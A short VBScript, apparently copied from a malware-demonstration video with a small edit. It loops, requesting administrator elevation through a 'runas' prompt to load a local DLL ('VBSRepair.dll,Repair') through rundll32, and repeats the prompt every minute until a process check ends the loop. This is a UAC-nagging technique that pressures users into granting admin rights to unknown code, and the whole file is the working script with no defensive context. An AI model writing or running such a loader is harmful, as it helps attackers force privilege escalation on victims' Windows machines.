' This script is from a video of ebola man
' and there is just a very small change in it
' changing the cmd.exe into powershell.exe

Dim objFSO, objFile, strScriptPath, strCurrentDir, objShell, objWMIService, colProcesses

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set objFile = objFSO.GetFile(WScript.ScriptFullName)
strScriptPath = objFile.ParentFolder.Path
strCurrentDir = objFSO.GetAbsolutePathName(strScriptPath)

Set objShell = CreateObject("Shell.Application")
Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")

Do
    objShell.ShellExecute "rundll32.exe", strCurrentDir & "\VBSRepair.dll,Repair", "", "runas", 1

        CreateObject("WScript.Shell").Run "powershell.exe /c timeout /t 2 /nobreak", 0, True

    set colProcesses = objWMIService.ExecQuery("SELECT * From Win32_Process WHERE Name = 'powershell.exe'")
    WScript.Sleep 60000

    If colProcesses.Count > 0 Then Exit Do
Loop